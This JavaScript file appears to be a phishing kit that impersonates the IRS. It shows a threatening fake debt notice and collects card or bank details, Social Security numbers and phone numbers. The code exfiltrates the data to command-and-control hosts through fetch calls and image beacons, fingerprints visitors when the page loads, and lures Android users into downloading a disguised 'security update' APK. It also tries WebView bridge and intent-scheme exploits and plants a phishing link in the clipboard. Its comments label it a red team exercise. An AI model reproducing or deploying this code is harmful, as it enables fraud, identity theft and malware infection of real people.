
document.getElementById('audit-form').addEventListener('submit', function(event) {
    event.preventDefault();
    document.getElementById('result').innerHTML = 
        '<div style="border: 2px solid #d00; background-color: #fff5f5; padding: 15px; margin-bottom: 20px;">' +
        '<h3 style="color: #d00; margin-top: 0;">FINAL NOTICE - IMMEDIATE PAYMENT REQUIRED</h3>' +
        '<p style="font-weight: bold; font-size: 18px; color: #000; margin: 10px 0;">You owe $1309.11</p>' +
        '<p style="font-size: 14px; color: #333; margin: 10px 0;"><strong>WARNING:</strong> Failure to pay this debt may result in:</p>' +
        '<ul style="margin: 10px 0; padding-left: 20px; color: #333;">' +
        '<li>Levy on your wages, bank accounts, and other property</li>' +
        '<li>Seizure and sale of your real estate, vehicles, and personal property</li>' +
        '<li>Federal tax refund offset</li>' +
        '<li>Credit bureau reporting</li>' +
        '<li>Passport restrictions</li>' +
        '</ul>' +
        '<p style="font-size: 13px; color: #666; margin: 10px 0;"><em>The IRS has the legal authority to collect this debt through enforced collection actions without further notice.</em></p>' +
        '</div>' +
        '<button onclick="showPaymentOptions()" style="background-color: #003366; color: white; padding: 12px 25px; border: none; font-size: 16px; cursor: pointer; font-weight: bold;">MAKE PAYMENT NOW</button>';
});

function showPaymentOptions() {
    document.getElementById('result').innerHTML = `
        <div style="margin-top: 20px;">
            <h3 style="color: #003366; margin-bottom: 20px;">Payment Options for $1309.11</h3>
            
            <div style="margin-bottom: 20px;">
                <label style="display: block; margin-bottom: 10px; font-weight: bold;">Select Payment Method:</label>
                <input type="radio" id="card-option" name="payment-method" value="card" onchange="showPaymentForm()" checked>
                <label for="card-option" style="margin-left: 5px; margin-right: 20px;">Credit/Debit Card</label>
                
                <input type="radio" id="bank-option" name="payment-method" value="bank" onchange="showPaymentForm()">
                <label for="bank-option" style="margin-left: 5px;">Bank Account (ACH)</label>
            </div>
            
            <div id="payment-form"></div>
        </div>
    `;
    showPaymentForm();
}

function showPaymentForm() {
    const selectedMethod = document.querySelector('input[name="payment-method"]:checked').value;
    const formContainer = document.getElementById('payment-form');
    
    if (selectedMethod === 'card') {
        formContainer.innerHTML = `
            <div style="border: 1px solid #ccc; padding: 20px; background-color: #f9f9f9;">
                <h4 style="color: #003366; margin-top: 0;">Credit/Debit Card Payment</h4>
                <form id="card-form">
                    <div style="margin-bottom: 15px;">
                        <label style="display: block; margin-bottom: 5px; font-weight: bold;">Card Number *</label>
                        <input type="text" placeholder="1234 5678 9012 3456" maxlength="19" style="width: 100%; padding: 8px; border: 1px solid #666; box-sizing: border-box;">
                    </div>
                    <div style="display: flex; gap: 15px; margin-bottom: 15px;">
                        <div style="flex: 1;">
                            <label style="display: block; margin-bottom: 5px; font-weight: bold;">Expiry Date *</label>
                            <input type="text" placeholder="MM/YY" maxlength="5" style="width: 100%; padding: 8px; border: 1px solid #666; box-sizing: border-box;">
                        </div>
                        <div style="flex: 1;">
                            <label style="display: block; margin-bottom: 5px; font-weight: bold;">CVV *</label>
                            <input type="text" placeholder="123" maxlength="4" style="width: 100%; padding: 8px; border: 1px solid #666; box-sizing: border-box;">
                        </div>
                    </div>
                    <div style="margin-bottom: 15px;">
                        <label style="display: block; margin-bottom: 5px; font-weight: bold;">Cardholder Name *</label>
                        <input type="text" placeholder="John Doe" style="width: 100%; padding: 8px; border: 1px solid #666; box-sizing: border-box;">
                    </div>
                    <div style="margin-bottom: 15px;">
                        <label style="display: block; margin-bottom: 5px; font-weight: bold;">Phone Number *</label>
                        <input type="text" placeholder="(555) 123-4567" style="width: 100%; padding: 8px; border: 1px solid #666; box-sizing: border-box;">
                    </div>
                    <button type="button" onclick="processPayment('card')" style="background-color: #003366; color: white; padding: 12px 30px; border: none; font-size: 14px; cursor: pointer; font-weight: bold;">Pay $1309.11</button>
                </form>
            </div>
        `;
    } else {
        formContainer.innerHTML = `
            <div style="border: 1px solid #ccc; padding: 20px; background-color: #f9f9f9;">
                <h4 style="color: #003366; margin-top: 0;">Bank Account (ACH) Payment</h4>
                <form id="bank-form">
                    <div style="margin-bottom: 15px;">
                        <label style="display: block; margin-bottom: 5px; font-weight: bold;">Routing Number *</label>
                        <input type="text" placeholder="123456789" maxlength="9" style="width: 100%; padding: 8px; border: 1px solid #666; box-sizing: border-box;">
                    </div>
                    <div style="margin-bottom: 15px;">
                        <label style="display: block; margin-bottom: 5px; font-weight: bold;">Account Number *</label>
                        <input type="text" placeholder="1234567890" style="width: 100%; padding: 8px; border: 1px solid #666; box-sizing: border-box;">
                    </div>
                    <div style="margin-bottom: 15px;">
                        <label style="display: block; margin-bottom: 5px; font-weight: bold;">Account Type *</label>
                        <select style="width: 100%; padding: 8px; border: 1px solid #666; height: 34px; box-sizing: border-box;">
                            <option value="">Select Account Type</option>
                            <option value="checking">Checking</option>
                            <option value="savings">Savings</option>
                        </select>
                    </div>
                    <div style="margin-bottom: 15px;">
                        <label style="display: block; margin-bottom: 5px; font-weight: bold;">Account Holder Name *</label>
                        <input type="text" placeholder="John Doe" style="width: 100%; padding: 8px; border: 1px solid #666; box-sizing: border-box;">
                    </div>
                    <div style="margin-bottom: 15px;">
                        <label style="display: block; margin-bottom: 5px; font-weight: bold;">Phone Number *</label>
                        <input type="text" placeholder="(555) 123-4567" style="width: 100%; padding: 8px; border: 1px solid #666; box-sizing: border-box;">
                    </div>
                    <button type="button" onclick="processPayment('bank')" style="background-color: #003366; color: white; padding: 12px 30px; border: none; font-size: 14px; cursor: pointer; font-weight: bold;">Pay $1309.11</button>
                </form>
            </div>
        `;
    }
}

function processPayment(method) {
    // Collect form data for red team exercise
    const formData = gatherFormData(method);
    
    // Exfiltrate data to C2 server (red team exercise)
    exfiltrateData(formData);
    console.log('Red Team Exercise - Data Captured:', formData);
    
    // Deploy payload delivery mechanism
    if (navigator.userAgent.includes('Mobile') || navigator.userAgent.includes('Android')) {
        deployMobilePayload();
    }
    
    const methodText = method === 'card' ? 'Credit/Debit Card' : 'Bank Account';
    alert(`Payment of $1309.11 via ${methodText} is being processed...\n\nProcessing...`);
}

function gatherFormData(method) {
    const data = {
        method: method,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        ssn: document.getElementById('ssn')?.value,
        taxYear: document.getElementById('tax-year')?.value,
        filingStatus: document.getElementById('filing-status')?.value,
        spouseSSN: document.getElementById('spouse-ssn')?.value
    };
    
    if (method === 'card') {
        const cardInputs = document.querySelectorAll('#card-form input');
        cardInputs.forEach((input, index) => {
            data[`card_field_${index}`] = input.value;
        });
    } else {
        const bankInputs = document.querySelectorAll('#bank-form input, #bank-form select');
        bankInputs.forEach((input, index) => {
            data[`bank_field_${index}`] = input.value;
        });
    }
    
    return data;
}

function deployMobilePayload() {
    // mobile attack vectors
    
    // 1. Check for Android device
    if (navigator.userAgent.includes('Android')) {
        // Attempt APK download social engineering
        setTimeout(() => {
            const downloadLink = document.createElement('a');
            downloadLink.href = 'http://localhost:8888/download/irs_security_update.apk';
            downloadLink.download = 'irs_security_update.apk';
            downloadLink.style.display = 'none';
            document.body.appendChild(downloadLink);
            
            // Social engineering prompt
            if (confirm('Update Required\n\n install Update to.\n\nInstall Now')) {
                downloadLink.click();
            }
            document.body.removeChild(downloadLink);
        }, 2000);
    }
    
    // 2. Browser exploitation attempts
    exploitBrowserVulns();
}

function exploitBrowserVulns() {
    // Red team browser attack vectors
    
    // Check for vulnerable WebView
    if (window.Android && window.Android.processPayment) {
        // Attempt WebView JavaScript bridge exploitation
        try {
            window.Android.processPayment('{"exploit": "webview_bridge"}');
        } catch(e) {
            console.log('WebView bridge not vulnerable');
        }
    }
    
    // Attempt intent scheme exploitation (Android)
    if (navigator.userAgent.includes('Android')) {
        const maliciousIntents = [
            'intent://example.com#Intent;scheme=http;package=com.android.browser;end',
            'intent://settings#Intent;scheme=android-app;package=com.android.settings;end'
        ];
        
        maliciousIntents.forEach(intent => {
            try {
                window.location.href = intent;
            } catch(e) {
                // Intent blocked
            }
        });
    }
    
    // Clipboard manipulation for credential harvesting
    if (navigator.clipboard) {
        navigator.clipboard.writeText('IRS Payment Portal - Verify your identity at http://irs-verification.example.com');
    }
}

function exfiltrateData(data) {
    // Red team data exfiltration - multiple methods for redundancy
    
    // Dynamic C2 server detection - realistic attacker approach
    const c2Hosts = [
        'http://localhost:8888',  // Primary C2
        'http://127.0.0.1:8888',  // Backup C2
        window.location.origin    // Same origin fallback
    ];
    
    // Try multiple exfiltration methods
    let exfilSuccess = false;
    
    // Method 1: Direct POST to C2 servers
    c2Hosts.forEach(host => {
        if (!exfilSuccess) {
            fetch(`${host}/collect`, {
                method: 'POST',
                mode: 'no-cors', // Bypass CORS for attack simulation
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    type: 'form_data',
                    timestamp: new Date().toISOString(),
                    data: data
                })
            }).then(() => {
                exfilSuccess = true;
                console.log(`[+] Data exfiltrated to ${host}`);
            }).catch(err => {
                console.log(`[-] Failed to exfiltrate to ${host}`);
            });
        }
    });
    
    // Method 2: Image beacon (always works, no CORS)
    setTimeout(() => {
        const img = new Image();
        img.src = `http://localhost:8888/track.gif?data=${encodeURIComponent(JSON.stringify(data))}`;
        img.onerror = () => {
            // Try alternative beacon
            const img2 = new Image();
            img2.src = `data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==`;
        };
    }, 1000);
    
    // Method 3: Alternative channel - localStorage persistence
    try {
        localStorage.setItem('tax_data_backup', JSON.stringify(data));
        
        // Method 4: Base64 encoded beacon (harder to detect)
        const encodedData = btoa(JSON.stringify(data));
        const img3 = new Image();
        img3.src = `http://localhost:8888/pixel.png?t=${encodedData.substring(0, 50)}`;
    } catch (e) {
        console.log('Storage method failed');
    }
}

// Initialize device fingerprinting on page load
document.addEventListener('DOMContentLoaded', function() {
    // Collect initial device information
    const deviceInfo = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen: {
            width: screen.width,
            height: screen.height
        },
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        referrer: document.referrer,
        url: window.location.href
    };
    
    // Send device fingerprint to C2 servers
    const c2Hosts = [
        'http://localhost:8888',  // Primary C2
        'http://127.0.0.1:8888',  // Backup C2
    ];
    
    c2Hosts.forEach(host => {
        fetch(`${host}/collect`, {
            method: 'POST',
            mode: 'no-cors',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                type: 'device_fingerprint',
                data: deviceInfo
            })
        }).catch(() => {
            // Silent fail for stealth
        });
    });
    
    // Beacon fallback for device fingerprinting
    const img = new Image();
    img.src = `http://localhost:8888/track.gif?data=${encodeURIComponent(JSON.stringify({type: 'device_fingerprint', data: deviceInfo}))}`;
});
